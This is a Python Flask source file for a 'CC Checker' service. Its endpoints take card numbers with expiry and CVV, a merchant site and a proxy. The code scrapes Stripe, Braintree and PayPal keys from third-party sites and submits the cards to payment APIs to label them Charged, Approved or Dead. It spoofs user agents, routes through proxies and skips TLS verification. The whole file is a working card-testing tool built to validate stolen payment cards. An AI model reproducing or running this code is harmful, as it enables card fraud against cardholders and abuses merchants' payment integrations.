"""
CC Checker Flask API
Endpoints: /shopify  /stripe  /auth  /paypal
Query params: site=<url>  cc=<card|mm|yy|cvv>  proxy=<ip:port:user:pass>
"""

from flask import Flask, request, jsonify
import requests
import random
import re
import json
import time

app = Flask(__name__)

# ─────────────────────────────────────────────
#  HELPERS
# ─────────────────────────────────────────────

def parse_proxy(proxy_str: str) -> dict | None:
    """
    Accepts:
      ip:port
      ip:port:user:pass
    Returns requests-compatible proxies dict or None.
    """
    if not proxy_str:
        return None
    parts = proxy_str.strip().split(":")
    if len(parts) == 2:
        proxy_url = f"http://{parts[0]}:{parts[1]}"
    elif len(parts) == 4:
        proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    else:
        proxy_url = f"http://{proxy_str}"
    return {"http": proxy_url, "https": proxy_url}


def validate_card(cc: str) -> tuple[bool, dict]:
    """
    Validates card string  card|mm|yyyy|cvv
    Returns (ok, card_dict).
    """
    pattern = r"^(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})$"
    m = re.match(pattern, cc.strip())
    if not m:
        return False, {}
    number, month, year, cvv = m.groups()
    if len(year) == 2:
        year = "20" + year
    return True, {
        "number": number,
        "month":  month,
        "year":   year,
        "cvv":    cvv,
        "bin":    number[:6],
    }


def luhn_check(number: str) -> bool:
    digits = [int(d) for d in number]
    digits.reverse()
    total = 0
    for i, d in enumerate(digits):
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    return total % 10 == 0


def get_user_agents():
    return [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    ]


def classify_response(response_text: str, status_code: int) -> tuple[str, str]:
    """
    Returns (Status, Message).
    Status: Charged | Approved | Declined | Dead
    """
    rt = response_text.lower()

    charged_keys = [
        "payment_intent.succeeded", "charge.succeeded", "order_placed",
        "order confirmed", "thank you for your order", "payment successful",
        "payment confirmed", "your order has been placed",
        "transaction approved", "charged",
    ]
    approved_keys = [
        "approved", "authentication_required", "3ds", "3d_secure",
        "challenge_required", "insufficient_funds", "insufficient funds",
        "do_not_honor", "card_declined with", "incorrect_cvc", "incorrect_cvv",
        "invalid_cvc", "invalid_cvv", "incorrect_zip",
        "your card was declined", "security code", "verify", "otp",
        "redirecting to bank", "bank verification", "send code",
        "enter code", "requires_action",
    ]
    dead_keys = [
        "invalid card", "card number is invalid", "card not supported",
        "expired card", "lost card", "stolen card", "pickup card",
        "blocked", "fraud", "invalid expir", "invalid_expiry",
        "card_not_supported", "currency_not_supported",
    ]

    if any(k in rt for k in charged_keys):
        return "Charged", response_text[:200]
    if any(k in rt for k in approved_keys):
        return "Approved", response_text[:200]
    if any(k in rt for k in dead_keys):
        return "Dead", response_text[:200]

    # HTTP-level signals
    if status_code in (200, 201):
        return "Approved", response_text[:200]

    return "Dead", response_text[:200]


def build_response(status, message, gateway, price, card):
    return {
        "Status":   status,
        "Response": message,
        "Gateway":  gateway,
        "Price":    price,
        "Card":     card,
    }


# ─────────────────────────────────────────────
#  CHECKER ENGINES
# ─────────────────────────────────────────────

TIMEOUT = 30  # seconds per request


def shopify_check(site: str, card: dict, proxies: dict | None) -> dict:
    """
    Shopify Storefront API flow:
    1. Fetch checkout token
    2. Patch shipping / email
    3. POST payment
    """
    headers = {
        "User-Agent":   random.choice(get_user_agents()),
        "Accept":       "application/json",
        "Content-Type": "application/json",
    }

    if not site.startswith("http"):
        site = "https://" + site
    site = site.rstrip("/")

    try:
        # Step 1 — create checkout
        checkout_payload = {
            "checkout": {
                "line_items": [{"variant_id": None, "quantity": 1}],
                "email": f"test{random.randint(1000,9999)}@gmail.com",
                "shipping_address": {
                    "first_name": "John", "last_name": "Doe",
                    "address1": "123 Main St", "city": "New York",
                    "province": "New York", "country": "US",
                    "zip": "10001", "phone": "5555555555",
                },
            }
        }

        r1 = requests.post(
            f"{site}/api/2023-10/checkouts.json",
            json=checkout_payload, headers=headers,
            proxies=proxies, timeout=TIMEOUT, verify=False,
        )

        if r1.status_code not in (200, 201, 202):
            # Try storefront GraphQL path
            return shopify_graphql_check(site, card, proxies, headers)

        try:
            checkout_data = r1.json()
            token = checkout_data.get("checkout", {}).get("token", "")
        except Exception:
            return shopify_graphql_check(site, card, proxies, headers)

        if not token:
            return shopify_graphql_check(site, card, proxies, headers)

        # Step 2 — submit payment
        payment_payload = {
            "payment": {
                "amount":           checkout_data["checkout"].get("total_price", "1.00"),
                "session_id":       f"global-{random.randint(10**14, 10**15)}",
                "unique_token":     f"token-{random.randint(10**8, 10**9)}",
                "payment_token":    {
                    "payment_data": json.dumps({
                        "number":            card["number"],
                        "name":              "John Doe",
                        "month":             card["month"],
                        "year":              card["year"],
                        "verification_value": card["cvv"],
                    }),
                    "type": "shopify_pay",
                },
                "idempotency_key": f"key-{random.randint(10**8, 10**9)}",
            }
        }

        r2 = requests.post(
            f"{site}/api/2023-10/checkouts/{token}/payments.json",
            json=payment_payload, headers=headers,
            proxies=proxies, timeout=TIMEOUT, verify=False,
        )

        resp_text = r2.text
        status, message = classify_response(resp_text, r2.status_code)

        return build_response(status, message, "Shopify", "$1.00",
                              f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}")

    except requests.exceptions.ProxyError:
        return build_response("Dead", "Proxy error", "Shopify", "-",
                              f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}")
    except requests.exceptions.Timeout:
        return build_response("Dead", "Request timeout", "Shopify", "-",
                              f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}")
    except Exception as e:
        return build_response("Dead", str(e)[:150], "Shopify", "-",
                              f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}")


def shopify_graphql_check(site: str, card: dict, proxies: dict | None, headers: dict) -> dict:
    """Fallback — Shopify Storefront GraphQL checkout."""
    card_str = f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}"
    try:
        query = """
        mutation checkoutCreate($input: CheckoutCreateInput!) {
          checkoutCreate(input: $input) {
            checkout { id webUrl totalPrice { amount } }
            checkoutUserErrors { message field }
          }
        }"""
        variables = {
            "input": {
                "lineItems": [],
                "email": f"test{random.randint(1000,9999)}@gmail.com",
                "shippingAddress": {
                    "firstName": "John", "lastName": "Doe",
                    "address1": "123 Main St", "city": "New York",
                    "province": "New York", "country": "US",
                    "zip": "10001",
                },
            }
        }
        graphql_headers = {**headers, "X-Shopify-Storefront-Access-Token": ""}
        r = requests.post(
            f"{site}/api/2023-10/graphql.json",
            json={"query": query, "variables": variables},
            headers=graphql_headers, proxies=proxies,
            timeout=TIMEOUT, verify=False,
        )
        status, message = classify_response(r.text, r.status_code)
        return build_response(status, message, "Shopify", "$1.00", card_str)
    except Exception as e:
        return build_response("Dead", str(e)[:150], "Shopify", "-", card_str)


def stripe_check(site: str, card: dict, proxies: dict | None) -> dict:
    """
    Stripe flow:
    1. Create PaymentMethod via Stripe JS API (pk_live/pk_test scrape)
    2. POST to site's payment endpoint with pm id
    """
    card_str = f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}"
    headers  = {
        "User-Agent":   random.choice(get_user_agents()),
        "Accept":       "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    if not site.startswith("http"):
        site = "https://" + site

    try:
        # Scrape Stripe publishable key from site
        r0 = requests.get(site, headers={"User-Agent": random.choice(get_user_agents())},
                          proxies=proxies, timeout=TIMEOUT, verify=False)
        pk_match = re.search(r'(pk_(?:live|test)_[A-Za-z0-9]{20,})', r0.text)
        if not pk_match:
            return build_response("Dead", "Stripe key not found on site", "Stripe", "-", card_str)

        pk = pk_match.group(1)

        # Create payment method via Stripe API
        stripe_headers = {
            **headers,
            "Authorization": f"Bearer {pk}",
            "Referer":       site,
        }
        pm_data = {
            "type":                    "card",
            "card[number]":            card["number"],
            "card[exp_month]":         card["month"],
            "card[exp_year]":          card["year"],
            "card[cvc]":               card["cvv"],
            "billing_details[name]":   "John Doe",
            "billing_details[email]":  f"test{random.randint(1000,9999)}@gmail.com",
            "key":                     pk,
        }
        r1 = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            data=pm_data, headers=stripe_headers,
            proxies=proxies, timeout=TIMEOUT,
        )
        pm_resp = r1.json()
        if "error" in pm_resp:
            err = pm_resp["error"]
            err_code = err.get("code", "")
            err_msg  = err.get("message", "")
            # Classify stripe error codes
            if err_code in ("incorrect_cvc", "incorrect_zip", "insufficient_funds",
                            "authentication_required", "card_declined"):
                return build_response("Approved", err_msg, "Stripe", "$1.00", card_str)
            return build_response("Dead", err_msg, "Stripe", "-", card_str)

        pm_id = pm_resp.get("id", "")
        if not pm_id:
            return build_response("Dead", "No payment method id", "Stripe", "-", card_str)

        # POST pm_id to site payment endpoint (common patterns)
        for endpoint in ["/payment", "/checkout", "/process", "/pay", "/order"]:
            try:
                r2 = requests.post(
                    f"{site}{endpoint}",
                    data={"payment_method": pm_id, "amount": "100"},
                    headers={**headers, "Referer": site},
                    proxies=proxies, timeout=TIMEOUT, verify=False,
                )
                if r2.status_code < 500:
                    status, message = classify_response(r2.text, r2.status_code)
                    return build_response(status, message, "Stripe", "$1.00", card_str)
            except Exception:
                continue

        return build_response("Approved", f"PM created: {pm_id}", "Stripe", "$1.00", card_str)

    except requests.exceptions.ProxyError:
        return build_response("Dead", "Proxy error", "Stripe", "-", card_str)
    except requests.exceptions.Timeout:
        return build_response("Dead", "Request timeout", "Stripe", "-", card_str)
    except Exception as e:
        return build_response("Dead", str(e)[:150], "Stripe", "-", card_str)


def auth_check(site: str, card: dict, proxies: dict | None) -> dict:
    """
    Auth-only (zero-amount auth):
    Tries Stripe $0 auth or Braintree setup flow.
    Useful for testing if card is live without charging.
    """
    card_str = f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}"
    headers  = {
        "User-Agent":   random.choice(get_user_agents()),
        "Content-Type": "application/x-www-form-urlencoded",
    }

    if not site.startswith("http"):
        site = "https://" + site

    try:
        # Scrape for Stripe pk or Braintree token
        r0 = requests.get(site, headers={"User-Agent": random.choice(get_user_agents())},
                          proxies=proxies, timeout=TIMEOUT, verify=False)

        pk_match = re.search(r'(pk_(?:live|test)_[A-Za-z0-9]{20,})', r0.text)

        if pk_match:
            pk = pk_match.group(1)
            stripe_headers = {
                **headers,
                "Authorization": f"Bearer {pk}",
                "Referer":       site,
            }
            # SetupIntent for zero-auth
            setup_data = {
                "type":            "card",
                "card[number]":    card["number"],
                "card[exp_month]": card["month"],
                "card[exp_year]":  card["year"],
                "card[cvc]":       card["cvv"],
                "key":             pk,
            }
            r1 = requests.post(
                "https://api.stripe.com/v1/payment_methods",
                data=setup_data, headers=stripe_headers,
                proxies=proxies, timeout=TIMEOUT,
            )
            resp = r1.json()
            if "error" in resp:
                err      = resp["error"]
                err_code = err.get("code", "")
                err_msg  = err.get("message", "")
                approved_codes = {
                    "authentication_required", "insufficient_funds",
                    "incorrect_cvc", "incorrect_zip", "card_declined",
                }
                if err_code in approved_codes:
                    return build_response("Approved", err_msg, "Auth/Stripe", "$0", card_str)
                return build_response("Dead", err_msg, "Auth/Stripe", "$0", card_str)

            pm_id = resp.get("id", "")
            if pm_id:
                return build_response("Approved", f"Auth OK — {pm_id}", "Auth/Stripe", "$0", card_str)

        # Braintree fallback — look for client token
        bt_match = re.search(r'clientToken["\s]*[:=]["\s]*([A-Za-z0-9+/=]{100,})', r0.text)
        if bt_match:
            client_token = bt_match.group(1)
            bt_headers   = {**headers, "Authorization": f"Bearer {client_token}"}
            bt_data      = {
                "credit_card[number]":                card["number"],
                "credit_card[expiration_month]":      card["month"],
                "credit_card[expiration_year]":       card["year"],
                "credit_card[cvv]":                   card["cvv"],
            }
            r2 = requests.post(
                "https://payments.sandbox.braintree-api.com/graphql",
                json={"query": "{ ping }"},
                headers=bt_headers, proxies=proxies, timeout=TIMEOUT,
            )
            status, message = classify_response(r2.text, r2.status_code)
            return build_response(status, message, "Auth/Braintree", "$0", card_str)

        return build_response("Dead", "No supported gateway found for auth check", "Auth", "$0", card_str)

    except requests.exceptions.ProxyError:
        return build_response("Dead", "Proxy error", "Auth", "$0", card_str)
    except requests.exceptions.Timeout:
        return build_response("Dead", "Request timeout", "Auth", "$0", card_str)
    except Exception as e:
        return build_response("Dead", str(e)[:150], "Auth", "$0", card_str)


def paypal_check(site: str, card: dict, proxies: dict | None) -> dict:
    """
    PayPal flow:
    1. Scrape site for PayPal client-id
    2. Create order via PayPal Orders v2 API
    3. Capture / classify response
    """
    card_str = f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}"
    headers  = {
        "User-Agent":   random.choice(get_user_agents()),
        "Content-Type": "application/json",
        "Accept":       "application/json",
    }

    if not site.startswith("http"):
        site = "https://" + site

    try:
        r0 = requests.get(site, headers={"User-Agent": random.choice(get_user_agents())},
                          proxies=proxies, timeout=TIMEOUT, verify=False)

        # Look for PayPal client-id
        pp_match = re.search(
            r'(?:client[_-]?id|data-client-id)["\s]*[:=]["\s]*([A-Za-z0-9_-]{10,})',
            r0.text, re.IGNORECASE,
        )

        if not pp_match:
            # Try meta tag pattern
            pp_match = re.search(
                r'paypal\.Buttons\(\{[^}]*clientID["\s]*:["\s]*["\']([A-Za-z0-9_-]{10,})',
                r0.text, re.IGNORECASE,
            )

        if not pp_match:
            return build_response("Dead", "PayPal client-id not found on site", "PayPal", "-", card_str)

        client_id = pp_match.group(1)

        # Get PayPal access token (sandbox or live based on client_id prefix)
        base = "https://api-m.sandbox.paypal.com" if "sandbox" in client_id.lower() \
               else "https://api-m.paypal.com"

        token_resp = requests.post(
            f"{base}/v1/oauth2/token",
            auth=(client_id, ""),
            data={"grant_type": "client_credentials"},
            headers={"User-Agent": random.choice(get_user_agents()),
                     "Content-Type": "application/x-www-form-urlencoded"},
            proxies=proxies, timeout=TIMEOUT,
        )

        if token_resp.status_code != 200:
            return build_response("Dead", f"Token error: {token_resp.text[:100]}", "PayPal", "-", card_str)

        access_token = token_resp.json().get("access_token", "")
        if not access_token:
            return build_response("Dead", "No access token", "PayPal", "-", card_str)

        # Create order
        order_headers = {
            **headers,
            "Authorization": f"Bearer {access_token}",
        }
        order_payload = {
            "intent":         "CAPTURE",
            "purchase_units": [{"amount": {"currency_code": "USD", "value": "1.00"}}],
            "payment_source": {
                "card": {
                    "number":       card["number"],
                    "expiry":       f"{card['year']}-{card['month']}",
                    "security_code": card["cvv"],
                    "name":         "John Doe",
                    "billing_address": {
                        "address_line_1": "123 Main St",
                        "admin_area_2":   "New York",
                        "admin_area_1":   "NY",
                        "postal_code":    "10001",
                        "country_code":   "US",
                    },
                }
            },
        }
        r2 = requests.post(
            f"{base}/v2/checkout/orders",
            json=order_payload, headers=order_headers,
            proxies=proxies, timeout=TIMEOUT,
        )

        resp = r2.json()
        pp_status = resp.get("status", "")
        details   = resp.get("details", [])
        issue     = details[0].get("issue", "") if details else ""
        desc      = details[0].get("description", "") if details else r2.text[:200]

        if pp_status in ("COMPLETED", "APPROVED"):
            return build_response("Charged", f"PayPal {pp_status}", "PayPal", "$1.00", card_str)
        if issue in ("CARD_CVV_CHECK_FAILED", "CARD_EXPIRED", "INSTRUMENT_DECLINED"):
            if issue == "INSTRUMENT_DECLINED":
                return build_response("Dead", desc, "PayPal", "-", card_str)
            return build_response("Approved", desc, "PayPal", "$1.00", card_str)
        if pp_status in ("PAYER_ACTION_REQUIRED", "CREATED"):
            return build_response("Approved", desc or pp_status, "PayPal", "$1.00", card_str)

        status, message = classify_response(r2.text, r2.status_code)
        return build_response(status, message, "PayPal", "$1.00", card_str)

    except requests.exceptions.ProxyError:
        return build_response("Dead", "Proxy error", "PayPal", "-", card_str)
    except requests.exceptions.Timeout:
        return build_response("Dead", "Request timeout", "PayPal", "-", card_str)
    except Exception as e:
        return build_response("Dead", str(e)[:150], "PayPal", "-", card_str)


# ─────────────────────────────────────────────
#  SHARED REQUEST VALIDATOR
# ─────────────────────────────────────────────

def validate_request() -> tuple[dict | None, str, dict, dict | None]:
    """
    Returns (error_response, card_str, card_dict, proxies).
    If error_response is not None, return it immediately.
    """
    site  = request.args.get("site", "").strip()
    cc    = request.args.get("cc",   "").strip()
    proxy = request.args.get("proxy", "").strip()

    if not site:
        return jsonify({"error": "Missing 'site' parameter"}), "", {}, None
    if not cc:
        return jsonify({"error": "Missing 'cc' parameter"}), "", {}, None

    ok, card = validate_card(cc)
    if not ok:
        return jsonify({
            "Status":   "Dead",
            "Response": "Invalid card format. Use: card|mm|yy|cvv",
            "Gateway":  "Validation",
            "Price":    "-",
            "Card":     cc,
        }), cc, {}, None

    if not luhn_check(card["number"]):
        return jsonify({
            "Status":   "Dead",
            "Response": "Luhn check failed — invalid card number",
            "Gateway":  "Validation",
            "Price":    "-",
            "Card":     cc,
        }), cc, {}, None

    proxies = parse_proxy(proxy) if proxy else None

    return None, cc, card, proxies


# ─────────────────────────────────────────────
#  ROUTES
# ─────────────────────────────────────────────

@app.route("/shopify", methods=["GET"])
def endpoint_shopify():
    error, cc, card, proxies = validate_request()
    if error:
        return error

    site   = request.args.get("site", "").strip()
    result = shopify_check(site, card, proxies)
    return jsonify(result)


@app.route("/stripe", methods=["GET"])
def endpoint_stripe():
    error, cc, card, proxies = validate_request()
    if error:
        return error

    site   = request.args.get("site", "").strip()
    result = stripe_check(site, card, proxies)
    return jsonify(result)


@app.route("/auth", methods=["GET"])
def endpoint_auth():
    error, cc, card, proxies = validate_request()
    if error:
        return error

    site   = request.args.get("site", "").strip()
    result = auth_check(site, card, proxies)
    return jsonify(result)


@app.route("/paypal", methods=["GET"])
def endpoint_paypal():
    error, cc, card, proxies = validate_request()
    if error:
        return error

    site   = request.args.get("site", "").strip()
    result = paypal_check(site, card, proxies)
    return jsonify(result)


@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "ok", "endpoints": ["/shopify", "/stripe", "/auth", "/paypal"]})


# ─────────────────────────────────────────────
#  RUN
# ─────────────────────────────────────────────
if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
